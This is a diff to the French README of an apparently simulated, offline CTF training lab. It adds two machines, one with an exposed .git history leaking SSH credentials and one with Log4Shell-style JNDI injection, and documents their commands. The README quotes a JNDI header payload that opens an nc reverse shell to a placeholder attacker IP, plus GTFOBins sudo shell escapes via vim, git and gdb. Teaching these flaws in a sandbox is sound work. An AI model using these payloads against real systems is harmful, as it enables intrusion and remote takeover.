@@ -11,7 +11,7 @@ Aucun build : ouvre simplement `index.html` dans un navigateur.
 ```
 index.html        Page + layout (sidebar machines + terminal)
 css/style.css      Thème sombre / clair / contraste élevé, effets FX
-js/machines.js     Données des 18 machines (fs, services, creds, exploits, indices)
+js/machines.js     Données des 20 machines (fs, services, creds, exploits, indices)
 js/engine.js        Moteur : FS virtuel, commandes, pipes, scoring, badges, records, write-up, sauvegarde
 js/app.js           Liaison DOM <-> moteur (input, prompt, toasts, sidebar, particules, PWA)
 manifest.json      Manifeste PWA (installation, icône, nom)
@@ -63,6 +63,14 @@ utilisés sont sauvegardés dans le `localStorage` du navigateur (clé `ctf_lab_
   **"alg:none"** (la signature n'est jamais vérifiée si le jeton l'annonce) → un jeton forgé à la main
   (`base64url`/`base64urld` en pipe) avec un rôle admin fuite des identifiants SSH → sudo GTFOBins sur
   `vim` (`sudo vim -c ':!/bin/sh'`)
+- **RELIC** (moyen) — dossier `.git` déployé par erreur avec l'application → historique de commits
+  navigable avec `git log`/`git show` (simulés) → un ancien commit "sera retiré avant le merge" fuite
+  des identifiants SSH, toujours lisibles dans son diff malgré un commit correctif ultérieur → sudo
+  GTFOBins sur `git` (`sudo git -p help config`, même mécanique pager que less/man)
+- **ECHOLOG** (difficile) — service de journalisation vulnérable à une **injection JNDI façon
+  Log4Shell** (CVE-2021-44228) : un en-tête `User-Agent` contenant `${jndi:ldap://...}` est évalué par
+  une bibliothèque de logs non patchée au lieu d'être simplement journalisé → RCE directe (callback
+  `nc`) → sudo GTFOBins (`gdb -nx -ex '!sh' -ex quit`)
 - **AXIOM** (insane) — logs CI/CD exposés → SSH → appartenance au groupe `docker` (équivalent root via
   montage du disque hôte dans un conteneur)
 
@@ -106,7 +114,7 @@ l'autre sans backend.
 
 ## Mode Jeopardy
 
-En plus des 18 machines en mode boîte, un mini mode Jeopardy propose 11 défis indépendants
+En plus des 20 machines en mode boîte, un mini mode Jeopardy propose 11 défis indépendants
 (Crypto ×4, Forensics ×2, Misc ×1, Stégano ×1, Réseau ×1, Pwn ×1, OSINT ×1) : `challenges` pour la
 liste, `challenge <id>` pour l'énoncé, `chint <id>` pour des indices progressifs, `submit <id> <flag>`
 pour valider. Les points s'ajoutent au score global (donc au niveau/XP). Le défi "Mot de passe
@@ -223,6 +231,26 @@ implémentations sautent totalement la vérification de signature si l'en-tête 
 Aucune cryptographie n'est simulée (pas de vrai HMAC) : c'est fidèle à la faille elle-même, qui ne
 dépend jamais de casser une signature — seulement de convaincre le serveur de ne pas la vérifier.
 
+## Injection JNDI façon Log4Shell (ECHOLOG) & dépôt `.git` exposé (RELIC)
+
+Deux nouvelles familles de vulnérabilités, chacune illustrée par une machine dédiée :
+
+- **Injection JNDI (CVE-2021-44228, "Log4Shell")** : sur **ECHOLOG**, un endpoint de journalisation
+  logue tel quel n'importe quel en-tête de requête HTTP (`User-Agent` par défaut). Une bibliothèque de
+  logs non patchée évalue les lookups `${jndi:ldap://...}` qu'elle y trouve au lieu de les traiter
+  comme du texte. Le lab simplifie le vecteur réel (qui charge normalement une classe distante via un
+  second service LDAP) en un callback direct, comme les autres RCE du lab : `curl -H 'User-Agent:
+  ${jndi:ldap://<ip_attaquant>:1389/x;nc <ip_attaquant> <port> -e /bin/sh}' <url>` après une écoute
+  `nc -lvnp <port>` — **guillemets simples obligatoires** pour éviter que le shell simulé n'interprète
+  `${...}` comme une expansion de variable (comme en vrai bash, d'ailleurs, avec ce genre de payload).
+- **Dépôt `.git` exposé** : sur **RELIC**, le déploiement s'est fait par simple copie du dossier de
+  travail, dossier `.git` inclus. Le lab expose un historique de commits en dur, navigable avec deux
+  nouvelles commandes simulées (pas un vrai clone ni un vrai parsing d'objets git compressés) :
+  `git log <ip>` liste les commits (hash court + message), `git show <ip> <hash>` affiche le diff
+  complet d'un commit (les premiers caractères du hash suffisent). Un secret présent dans un ancien
+  commit reste parfaitement lisible même après un commit correctif ultérieur — l'historique, lui, ne
+  ment pas.
+
 ## Accessibilité & hors-ligne
 
 Le bouton de thème (🌙/☀️/◐) propose désormais un 3ᵉ thème **contraste élevé**. Le terminal utilise
@@ -249,7 +277,7 @@ qui demandent d'éditer un script (ex : le cron piégeable de CERBERUS).
 ## Commandes principales
 
 Recon : `nmap <ip>`, `curl <url>` (GET, ou POST avec `-d "champ=valeur"`), `ftp <ip>`, `nc <ip> <port>` (bannière brute), `nc -lvnp <port>` (écoute, pour attraper une reverse shell si une machine le propose), `cloudctl ls|get|cp|assume-role` (stockage objet simulé + prise de rôle IAM), `curl "<url>?param=<url_interne>"` (SSRF vers une ressource interne, ex. métadonnées cloud)
-Accès : `ssh user@ip [-p port]`, `curl -F "file=@<webshell>" <url>` (upload sur un formulaire mal filtré), `ssh -L <lport>:<hôte_interne>:<port> user@<pivot>` (tunnel de pivot vers un hôte interne, une fois le pivot rooté), `curl -H "Authorization: Bearer <jwt>" <url>` (jeton d'authentification, répétable)
+Accès : `ssh user@ip [-p port]`, `curl -F "file=@<webshell>" <url>` (upload sur un formulaire mal filtré), `ssh -L <lport>:<hôte_interne>:<port> user@<pivot>` (tunnel de pivot vers un hôte interne, une fois le pivot rooté), `curl -H "Authorization: Bearer <jwt>" <url>` (jeton d'authentification, répétable), `curl -H '<En-tête>: <payload>' <url>` (injection via en-tête, ex. JNDI/Log4Shell — guillemets simples si le payload contient `${...}`), `git log <ip>` / `git show <ip> <hash>` (dépôt `.git` exposé, simulé)
 Système (Linux) : `ls [-la]`, `cd`, `pwd`, `cat`, `find`, `getcap -r /` (capabilities Linux, alternative au SUID), `echo [-n]`, `vim <fichier>` (alias `vi`/`nano`), `whoami`, `id`, `groups`, `sudo -l`, `sudo <cmd>`, `crontab -l`, `docker ps`
 Système (Windows, sur une machine cible Windows) : `dir`, `type`, `net user`, `net localgroup administrators`,
 `schtasks /query`, `icacls <fichier>` (les alias `ls`/`cat` fonctionnent aussi, comme dans PowerShell)
@@ -273,7 +301,7 @@ en **lecture seule** (`export` est déjà la commande de sauvegarde chiffrée, p
 
 Le bouton **🌐** de l'en-tête (ou le lien `index.html#en`) bascule l'interface entre **français et
 anglais** à chaud (choix mémorisé). L'i18n couvre toute l'interface (en-tête, info-bulles, sidebar,
-modales, bannière), l'aide (`help`), les briefings des 18 machines et les messages clés du gameplay
+modales, bannière), l'aide (`help`), les briefings des 20 machines et les messages clés du gameplay
 (cible active, accès, toasts de progression). Les indices détaillés et le lore des machines restent
 en français pour l'instant (l'infrastructure `i18n.js` / `bilang()` permet de les traduire au fil de l'eau).
 
@@ -374,6 +402,14 @@ Pour une machine web vulnérable à une LFI/SQLi (comme PHANTOM), pas de code mo
 - Machine interne / pivot (comme CITADEL) : mets `internal: true` et `pivot: { via, pivotIp }`. Le moteur
   rend l'IP injoignable (`nmap`/`ssh`/`curl`) tant qu'un tunnel `ssh -L <lport>:<ip_interne>:<port> user@<pivotIp>`
   n'a pas été ouvert — et ce tunnel exige que la machine pivot (`pivotIp`) soit déjà rootée.
+- Injection JNDI façon Log4Shell (comme ECHOLOG) : ajoute `machine.jndi = { path, header, injectRegex, user }`
+  (`header` par défaut : `user-agent`). `curl -H '<en-tête>: <payload>' <url><path>` déclenche le même
+  mécanisme de callback `nc <ip> <port>` que `altAccess`/`ssti`/`yamldeser` si `injectRegex` matche la
+  valeur de l'en-tête, sinon renvoie un accusé de réception générique (l'en-tête a bien été "logué").
+- Dépôt `.git` exposé (comme RELIC) : ajoute `machine.gitLeak = { commits: [{ hash, message, diff }, ...] }`.
+  Les nouvelles commandes `git log <ip>` / `git show <ip> <hash>` (aucun changement de moteur au-delà de
+  `cmdGit`, réutilisable par n'importe quelle machine) listent/affichent cet historique en dur — un secret
+  présent dans un commit reste lisible même après un commit correctif ultérieur dans la liste.
 
 Pour une machine Windows (comme GLACIER), ajoute `osType: "windows"` sur l'objet machine :
 le FS interne reste en chemins unix (`/Users/xxx`), `resolvePath` traduit automatiquement les
@@ -384,12 +420,12 @@ tout seul en style Windows.
 
 `node tests/run.js` lance une suite de tests zéro-dépendance (Node uniquement, pas de framework)
 qui charge `machines.js` + `engine.js` dans un contexte isolé et rejoue : le parsing/les pipes,
-l'exploitation complète des 18 machines (recon → accès → privesc → 2 flags chacune), le
+l'exploitation complète des 20 machines (recon → accès → privesc → 2 flags chacune), le
 remboursement de `reset`, la résolution des 11 défis Jeopardy et le mode Insane. À lancer après
 toute modification de `engine.js` ou `machines.js` pour éviter une régression silencieuse.
 
 `node tools/solve.js` est un **solveur automatique** (dev only, jamais embarqué dans le jeu) :
-il rejoue la solution officielle des 18 machines dans le vrai moteur et vérifie qu'aucun chemin
+il rejoue la solution officielle des 20 machines dans le vrai moteur et vérifie qu'aucun chemin
 d'exploit n'est cassé (les 5 jalons + le flag root de chaque machine). Code de sortie non-nul
 en cas de régression, donc utilisable en CI. Options : `--verbose` (chaque commande + sa sortie),
 `--walkthrough` (pas-à-pas propre), `--machine <id>` (une seule machine). Utile comme smoke test
